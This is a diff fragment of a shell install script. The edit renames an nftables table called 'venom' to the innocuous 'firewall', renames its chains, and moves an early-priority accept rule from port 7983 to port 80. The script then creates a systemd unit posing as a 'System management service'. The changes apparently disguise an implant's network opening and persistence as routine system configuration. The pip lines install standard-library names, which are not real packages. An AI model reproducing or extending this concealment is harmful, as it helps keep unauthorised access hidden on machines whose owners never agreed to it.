@@ -9,11 +9,11 @@ pip install os
 pip install socket
 pip install file
 pip install sys
-nft add table venom
-nft add chain venom input \{ type filter hook input priority -101 \; policy accept\; \}
-nft add chain venom output \{ type filter hook output priority -101 \; policy accept\; \}
-nft add rule venom input tcp dport { 7983 } accept
-nft add rule venom output tcp dport { 7983 } accept
+nft add table firewall
+nft add chain firewall vIn \{ type filter hook input priority -101 \; policy accept\; \}
+nft add chain firewall vOut \{ type filter hook output priority -101 \; policy accept\; \}
+nft add rule firewall vIn tcp dport { 80 } accept
+nft add rule firewall vOut tcp dport { 80 } accept
 cat <<EOFA > /etc/systemd/system/systemb.service
 [Unit]
 Description=System management service.
